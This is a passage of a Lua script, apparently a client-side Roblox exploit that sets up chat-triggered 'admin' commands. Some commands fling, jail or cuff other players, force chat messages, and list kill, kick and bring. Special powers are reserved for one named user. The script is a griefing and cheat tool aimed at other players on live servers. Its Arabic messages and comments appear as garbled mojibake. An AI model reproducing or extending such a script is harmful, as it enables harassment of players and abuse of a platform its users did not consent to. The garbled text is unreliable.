    addMessage("SYSTEM", "üëÅÔ∏è " .. admin .. " ÿπŸÖŸä ŸÜŸÅÿ≥Ÿá")
end

function Commands.unblind(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.blind = false
    reapplyPersistent()
    addMessage("SYSTEM", "üëÅÔ∏è " .. admin .. " ŸÅÿ™ÿ≠ ÿπŸäŸàŸÜ ŸÜŸÅÿ≥Ÿá")
end

function Commands.fling(admin, target)
    if isRestrictedPlace() and admin:lower() ~= "lol21536544" then
        addMessage("SYSTEM", "‚ùå Ÿáÿ∞ÿß ÿßŸÑÿ£ŸÖÿ± ÿ∫Ÿäÿ± ŸÖÿ≥ŸÖŸàÿ≠ ŸÅŸä Ÿáÿ∞ÿß ÿßŸÑÿ®ŸÑÿßŸäÿ≥")
        return
    end
    
    if target:lower() == "me" then
        runOrEnqueue(admin, "fling_exec", {admin, target})
    elseif target:lower() == "all" then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                Commands.fling_exec(admin, player.Name)
            end
        end
        addMessage("SYSTEM", "üåÄ " .. admin .. " ŸÅŸÑŸÜŸÇ ÿßŸÑÿ¨ŸÖŸäÿπ")
    else
        runOrEnqueue(admin, "fling_exec", {admin, target})
    end
end

function Commands.fling_exec(admin, target)
    local targetPlayer = findPlayerByPartial(target)
    if targetPlayer and targetPlayer.Character then
        local hrp = getHrp(targetPlayer)
        if not hrp then return end
        
        local bv = Instance.new("BodyVelocity")
        bv.Velocity = Vector3.new((math.random()-0.5)*3000, 1500, (math.random()-0.5)*3000)
        bv.MaxForce = Vector3.new(1e8,1e8,1e8)
        bv.Parent = hrp
        Debris:AddItem(bv, 0.9)
        
        addMessage("SYSTEM", "üåÄ " .. admin .. " ŸÅŸÑŸÜŸÇ " .. targetPlayer.Name)
    end
end

function Commands.nohair(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.nohair = true
    reapplyPersistent()
    addMessage("SYSTEM", "üíá " .. admin .. " ÿ≠ŸÑŸÇ ÿ¥ÿπÿ±Ÿá")
end

function Commands.rehair(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.nohair = false
    reapplyPersistent()
    addMessage("SYSTEM", "üíá " .. admin .. " ÿ£ÿπÿßÿØ ÿ¥ÿπÿ±Ÿá")
end

function Commands.slow(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.slow = true
    reapplyPersistent()
    addMessage("SYSTEM", "üêå " .. admin .. " ÿ®ÿ∑ÿ¶ ŸÜŸÅÿ≥Ÿá")
end

function Commands.unslow(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.slow = false
    reapplyPersistent()
    addMessage("SYSTEM", "‚ö° " .. admin .. " ÿ≥ÿ±ÿπ ŸÜŸÅÿ≥Ÿá")
end

function Commands.flash(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.noRender = true
    reapplyPersistent()
    addMessage("SYSTEM", "üí° " .. admin .. " ŸÅÿπŸÑ ÿßŸÑŸÅŸÑÿßÿ¥")
end

function Commands.unflash(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.noRender = false
    reapplyPersistent()
    addMessage("SYSTEM", "üí° " .. admin .. " ÿπÿ∑ŸÑ ÿßŸÑŸÅŸÑÿßÿ¥")
end

function Commands.dance(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.dance = true
    reapplyPersistent()
    addMessage("SYSTEM", "üíÉ " .. admin .. " ÿ±ŸÇÿµ")
end

function Commands.undance(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.dance = false
    reapplyPersistent()
    addMessage("SYSTEM", "üíÉ " .. admin .. " ÿ™ŸàŸÇŸÅ ÿπŸÜ ÿßŸÑÿ±ŸÇÿµ")
end

function Commands.spin(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.spin = true
    reapplyPersistent()
    addMessage("SYSTEM", "üåÄ " .. admin .. " ŸÑŸÅ ŸÜŸÅÿ≥Ÿá")
end

function Commands.unspin(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.spin = false
    reapplyPersistent()
    addMessage("SYSTEM", "üåÄ " .. admin .. " ÿ™ŸàŸÇŸÅ ÿπŸÜ ÿßŸÑŸÑŸÅ")
end

function Commands.scream(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.scream = true
    reapplyPersistent()
    addMessage("SYSTEM", "üò± " .. admin .. " ÿµÿßÿ≠")
end

function Commands.unscream(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.scream = false
    reapplyPersistent()
    addMessage("SYSTEM", "üò± " .. admin .. " ÿ™ŸàŸÇŸÅ ÿπŸÜ ÿßŸÑÿµÿ±ÿßÿÆ")
end

function Commands.check(admin, target)
    pcall(function()
        if TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral then
            TextChatService.TextChannels.RBXGeneral:SendAsync("‚úÖ")
        else
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("‚úÖ", "All")
        end
    end)
    addMessage("SYSTEM", "‚úÖ " .. admin .. " ŸÉÿ™ÿ® ‚úÖ")
end

function Commands.fun(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.fun = true
    reapplyPersistent()
    addMessage("SYSTEM", "üé™ " .. admin .. " ŸÅÿπŸÑ ÿßŸÑŸÅÿßŸÜ")
end

function Commands.unfun(admin, target)
    if target:lower() ~= "me" then return end
    
    persistent.fun = false
    reapplyPersistent()
    addMessage("SYSTEM", "üé™ " .. admin .. " ÿπÿ∑ŸÑ ÿßŸÑŸÅÿßŸÜ")
end

-- ===== ÿ£ŸàÿßŸÖÿ± ÿ≠ÿµÿ±Ÿäÿ© ŸÑŸÄ Lol21536544 =====
function Commands.jail(admin, target)
    if not canUseJailCommand(admin) then return end
    if not target then return end
    
    if target:lower() == "all" then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                createJailForPlayer(player)
            end
        end
        addMessage("SYSTEM", "üîí " .. admin .. " ÿ≥ÿ¨ŸÜ ÿßŸÑÿ¨ŸÖŸäÿπ")
    else
        local targetPlayer = findPlayerByPartial(target)
        if not targetPlayer then return end
        
        local success = createJailForPlayer(targetPlayer)
        if success then
            addMessage("SYSTEM", "üîí " .. admin .. " ÿ≥ÿ¨ŸÜ " .. targetPlayer.Name)
        end
    end
end

function Commands.unjail(admin, target)
    if not canUseJailCommand(admin) then return end
    if not target then return end
    
    if target:lower() == "all" then
        for playerName, _ in pairs(jails) do
            removeJail(playerName)
        end
        addMessage("SYSTEM", "üîì " .. admin .. " ÿ£ÿ∑ŸÑŸÇ ÿ≥ÿ±ÿßÿ≠ ÿßŸÑÿ¨ŸÖŸäÿπ")
    else
        local targetPlayer = findPlayerByPartial(target)
        if not targetPlayer then return end
        
        removeJail(targetPlayer.Name)
        addMessage("SYSTEM", "üîì " .. admin .. " ÿ£ÿ∑ŸÑŸÇ ÿ≥ÿ±ÿßÿ≠ " .. targetPlayer.Name)
    end
end

function Commands.say(admin, target, ...)
    if not canUseJailCommand(admin) then return end
    if not target then return end
    
    local message = table.concat({...}, " ")
    if message == "" then return end
    
    if target:lower() == "me" then
        pcall(function()
            if TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral then
                TextChatService.TextChannels.RBXGeneral:SendAsync(message)
            else
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
            end
        end)
        addMessage("SYSTEM", "üìù " .. admin .. " ÿ¨ÿ®ÿ± ŸÜŸÅÿ≥Ÿá ŸäŸÉÿ™ÿ®: \"" .. message .. "\"")
    elseif target:lower() == "all" then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                pcall(function()
                    if TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral then
                        TextChatService.TextChannels.RBXGeneral:SendAsync(message)
                    else
                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
                    end
                end)
            end
        end
        addMessage("SYSTEM", "üìù " .. admin .. " ÿ¨ÿ®ÿ± ÿßŸÑÿ¨ŸÖŸäÿπ ŸäŸÉÿ™ÿ®ŸàŸÜ: \"" .. message .. "\"")
    else
        local targetPlayer = findPlayerByPartial(target)
        if not targetPlayer then return end
        
        pcall(function()
            if TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral then
                TextChatService.TextChannels.RBXGeneral:SendAsync(message)
            else
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
            end
        end)
        addMessage("SYSTEM", "üìù " .. admin .. " ÿ¨ÿ®ÿ± " .. targetPlayer.Name .. " ŸäŸÉÿ™ÿ®: \"" .. message .. "\"")
    end
end

function Commands.cuffs(admin, target)
    if not canUseCuffsCommand(admin) then
        addMessage("SYSTEM", "‚ùå Ÿáÿ∞ÿß ÿßŸÑÿ£ŸÖÿ± ÿ≠ÿµÿ±Ÿä ŸÑŸÄ Lol21536544 ŸÅŸÇÿ∑")
        return
    end
    if not target then return end
    
    local targetPlayer = findPlayerByPartial(target)
    if not targetPlayer then
        addMessage("SYSTEM", "‚ùå ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿßŸÑŸÑÿßÿπÿ®")
        return
    end
    
    local adminPlayer = Players:FindFirstChild(admin)
    if not adminPlayer then
        addMessage("SYSTEM", "‚ùå ÿßŸÑÿ£ÿØŸÖŸÜ ÿ∫Ÿäÿ± ŸÖŸàÿ¨ŸàÿØ")
        return
    end
    
    local success = createCuffsForPlayer(targetPlayer, adminPlayer)
    if success then
        addMessage("SYSTEM", "üîó " .. admin .. " ŸÇŸäÿØ " .. targetPlayer.Name .. " ÿ®ÿßŸÑŸÉŸÅ")
    end
end

function Commands.uncuffs(admin, target)
    if not canUseCuffsCommand(admin) then
        addMessage("SYSTEM", "‚ùå Ÿáÿ∞ÿß ÿßŸÑÿ£ŸÖÿ± ÿ≠ÿµÿ±Ÿä ŸÑŸÄ Lol21536544 ŸÅŸÇÿ∑")
        return
    end
    if not target then return end
    
    local targetPlayer = findPlayerByPartial(target)
    if not targetPlayer then
        addMessage("SYSTEM", "‚ùå ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿßŸÑŸÑÿßÿπÿ®")
        return
    end
    
    local success = removeCuffsFromPlayer(targetPlayer)
    if success then
        addMessage("SYSTEM", "üîì " .. admin .. " ÿ£ÿ∑ŸÑŸÇ ÿ≥ÿ±ÿßÿ≠ " .. targetPlayer.Name .. " ŸÖŸÜ ÿßŸÑŸÉŸÅ")
    end
end

function Commands.cmd(admin, target)
    pcall(function()
        if TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral then
            TextChatService.TextChannels.RBXGeneral:SendAsync("üìã ÿßÿ≥ÿ™ÿÆÿØŸÖ /cmd ŸÑÿπÿ±ÿ∂ ÿ¨ŸÖŸäÿπ ÿßŸÑÿ£ŸàÿßŸÖÿ±")
        else
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("üìã ÿßÿ≥ÿ™ÿÆÿØŸÖ /cmd ŸÑÿπÿ±ÿ∂ ÿ¨ŸÖŸäÿπ ÿßŸÑÿ£ŸàÿßŸÖÿ±", "All")
        end
    end)
    addMessage("SYSTEM", "üìã " .. admin .. " ÿπÿ±ÿ∂ ÿßŸÑÿ£ŸàÿßŸÖÿ±")
end

-- ===== GUI ŸÑŸÑÿ£ŸàÿßŸÖÿ± =====
function Commands.cmds(admin, target)
    if not game:IsLoaded() then game.Loaded:Wait() end
    repeat task.wait() until LocalPlayer:FindFirstChild("PlayerGui")
    
    local oldGui = LocalPlayer.PlayerGui:FindFirstChild("CommandsGUI")
    if oldGui then oldGui:Destroy() end
    
    local commandsGui = Instance.new("ScreenGui")
    commandsGui.Name = "CommandsGUI"
    commandsGui.ResetOnSpawn = false
    commandsGui.Parent = LocalPlayer.PlayerGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 300, 0, 350)
    mainFrame.Position = UDim2.new(0.5, -150, 0.5, -175)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.Draggable = true
    mainFrame.Parent = commandsGui
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = mainFrame

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundColor3 = Color3.fromRGB(40, 40, 80)
    title.BorderSizePixel = 0
    title.Text = "üéÆ ÿ¨ŸÖŸäÿπ ÿßŸÑÿ£ŸàÿßŸÖÿ±"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 16
    title.Parent = mainFrame
    
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 10)
    titleCorner.Parent = title

    local closeButton = Instance.new("TextButton")
    closeButton.Size = UDim2.new(0, 30, 0, 30)
    closeButton.Position = UDim2.new(1, -35, 0, 5)
    closeButton.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
    closeButton.BorderSizePixel = 0
    closeButton.Text = "X"
    closeButton.TextColor3 = Color3.new(1, 1, 1)
    closeButton.Font = Enum.Font.GothamBold
    closeButton.TextSize = 14
    closeButton.Parent = mainFrame
    
    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0, 6)
    closeCorner.Parent = closeButton

    local scrollFrame = Instance.new("ScrollingFrame")
    scrollFrame.Size = UDim2.new(1, -10, 1, -50)
    scrollFrame.Position = UDim2.new(0, 5, 0, 45)
    scrollFrame.BackgroundTransparency = 1
    scrollFrame.BorderSizePixel = 0
    scrollFrame.ScrollBarThickness = 6
    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    scrollFrame.Parent = mainFrame

    local listLayout = Instance.new("UIListLayout")
    listLayout.Padding = UDim.new(0, 3)
    listLayout.Parent = scrollFrame

    local commandsContent = {
        "üéØ ÿßŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖ: /ÿßŸÑÿ£ŸÖÿ± ÿßŸÑŸáÿØŸÅ",
        "  /kill [me/all/ÿßÿ≥ŸÖ] - ŸÇÿ™ŸÑ",
        "  /kick [me/all/ÿßÿ≥ŸÖ] - ÿ∑ÿ±ÿØ",
        "  /bring [me/all/ÿßÿ≥ŸÖ] - ÿ¨ŸÑÿ®",
        "  /freeze [me/all/ÿßÿ≥ŸÖ] - ÿ™ÿ¨ŸÖŸäÿØ",
        "",
        "üîµ ÿßŸÑÿ≠ÿ±ŸÉÿ©:",
        "  /speed [me] [ÿ±ŸÇŸÖ] - ÿ≥ÿ±ÿπÿ©",
        "  /tp [ÿßÿ≥ŸÖ] - ÿßŸÑÿßŸÜÿ™ŸÇÿßŸÑ ŸÑŸÑÿßÿπÿ®",
        "",
        "üî¥ ÿßŸÑÿ™ÿ£ÿ´Ÿäÿ±ÿßÿ™ ÿßŸÑÿ¥ÿÆÿµŸäÿ©:",
        "  /vanish me - ÿ•ÿÆŸÅÿßÿ°",
        "  /noclip me - ŸÜŸàŸÉŸÑÿ®",
        "  /fun me - ŸÅÿßŸÜ",
        "  /dance me - ÿ±ŸÇÿµ",
        "  /spin me - ŸÑŸÅ",
        "",
        "üò± ÿßŸÑÿ™ÿ±ŸàŸäŸÑ:",
        "  /scream me - ÿµÿ±ÿßÿÆ",
        "  /blind me - ÿπŸÖŸâ",
        "  /flash me - ŸÅŸÑÿßÿ¥",
        "  /milk me - ŸÖŸäŸÄŸÑŸÉ",

        "",
        "üõë ÿ£ÿÆÿ±Ÿâ:",
        "  /check - ‚úÖ ŸÅŸä ÿßŸÑÿ¥ÿßÿ™",
        "  /yassin - Ÿäÿßÿ≥ŸäŸÜ ÿπŸÖŸä"
    }

    for _, text in pairs(commandsContent) do
        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(1, 0, 0, 15)
        textLabel.BackgroundTransparency = 1
        textLabel.Text = text
        textLabel.Font = Enum.Font.Gotham
        textLabel.TextSize = 10
        textLabel.TextXAlignment = Enum.TextXAlignment.Left
        textLabel.Parent = scrollFrame
        
        if text:find("üîµ") then textLabel.TextColor3 = Color3.fromRGB(100, 150, 255)
        elseif text:find("üî¥") then textLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        elseif text:find("üò±") then textLabel.TextColor3 = Color3.fromRGB(200, 100, 255)
        elseif text:find("‚ú®") then textLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
        elseif text:find("üõë") then textLabel.TextColor3 = Color3.fromRGB(255, 255, 100)
        elseif text:find("üéØ") then textLabel.TextColor3 = Color3.fromRGB(255, 150, 50)
        else textLabel.TextColor3 = Color3.fromRGB(255, 255, 255) end
    end

    task.wait(0.1)
    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y)

    closeButton.MouseButton1Click:Connect(function() commandsGui:Destroy() end)
    return commandsGui
end

task.wait(3)
if isAdmin(LocalPlayer.Name) then Commands.cmds("system", "all") end

-- ===== ŸÜÿ∏ÿßŸÖ ÿßŸÑÿ¥ÿßÿ™ =====
local lastMessage = ""
local function setupChatSystem()
    pcall(function()
        local function handleChat(player, msg)
            if lastMessage ~= msg then
                lastMessage = msg
                if not persistent.nospeak then 
                    addMessage(player.Name, msg) 
                end
                
                if isAdmin(player.Name) and msg:sub(1,1) == "/" then
                    local parts = {}
                    for w in msg:gmatch("%S+") do 
                        table.insert(parts, w) 
                    end
                    local cmd = parts[1] and parts[1]:sub(2)
                    local targ = parts[2]
                    local extra = {}
                    for i=3, #parts do 
                        table.insert(extra, parts[i]) 
                    end
                    
                    if cmd and Commands[cmd] then
                        if targ then
                            pcall(function() 
                                Commands[cmd](player.Name, targ, table.unpack(extra)) 
                            end)
                        end
                    end
                end
            end
        end
        
        for _, player in ipairs(Players:GetPlayers()) do 
            player.Chatted:Connect(function(msg) 
                handleChat(player, msg) 
            end) 
        end
        Players.PlayerAdded:Connect(function(player) 
            player.Chatted:Connect(function(msg) 
                handleChat(player, msg) 
            end) 
        end)
    end)
end

-- ===== ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑŸÜÿ∏ÿßŸÖ =====
setupChatSystem()
reapplyPersistent()

task.wait(2)
checkMyAdminStatus()

task.wait(3)
checkIfNeedsGUI()


print("‚úÖ ŸÜÿ∏ÿßŸÖ ÿßŸÑÿ£ÿØŸÖŸÜ ÿ¨ÿßŸáÿ≤ ŸÖÿπ ÿØÿπŸÖ GUI ŸÑŸÑŸÖŸàÿ®ÿßŸäŸÑ")
